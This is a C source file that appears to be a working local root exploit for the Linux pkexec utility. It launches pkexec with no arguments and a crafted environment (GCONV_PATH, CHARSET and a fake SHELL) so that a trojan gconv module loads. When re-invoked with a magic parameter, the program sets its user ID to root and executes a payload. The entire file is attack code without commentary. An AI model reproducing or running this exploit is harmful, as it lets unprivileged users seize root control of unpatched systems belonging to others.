#define _POSIX_C_SOURCE 200809L
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <libgen.h>

#include "constants.h"

int main(int argc, char **argv, char **envp)
{
	if (argc >= 2 && strcmp(argv[1], MAGIC_PARAM) == 0) {
		char *s;
		const char errRoot1[] = "Successfully started by gconv, but no root privileges!\n";
		const char errRoot2[] = "Failed to set real root ID!\n";
		if (geteuid() != 0) {
			write(2, errRoot1, sizeof(errRoot1) - 1);
			return EXIT_FAILURE;
		}
		if (setuid(0) == -1) {
			write(2, errRoot2, sizeof(errRoot2) - 1);
			return EXIT_FAILURE;
		}
		if ((s = getenv(SHELL_SAVE))) {
			setenv("SHELL", s, 1);
			unsetenv(SHELL_SAVE);
		}
		char *path = strdup(PAYLOAD_PATH);
		execve(path, (char * const []) {basename(path), NULL}, envp);
	}
	else {
		const char varName[] = SHELL_SAVE "=";
		char *s, *origShell;
		if ((s = getenv("SHELL"))) {
			origShell = malloc(sizeof(varName) + strlen(s));
			strcpy(origShell, varName);
			strcat(origShell, s);
		} else {
			origShell = NULL;
		}

		char *newenviron[] = { strdup(TROJAN_GCONV_PATH),
			strdup("PATH=GCONV_PATH=.:/usr/bin"),
			strdup("CHARSET=" TROJAN_CHARSET),
			strdup("SHELL=/does/not/exist"),
			origShell,
			NULL };
		execve(PKEXEC_PATH, (char * const *) {NULL}, newenviron);
	}
	return EXIT_FAILURE;
}
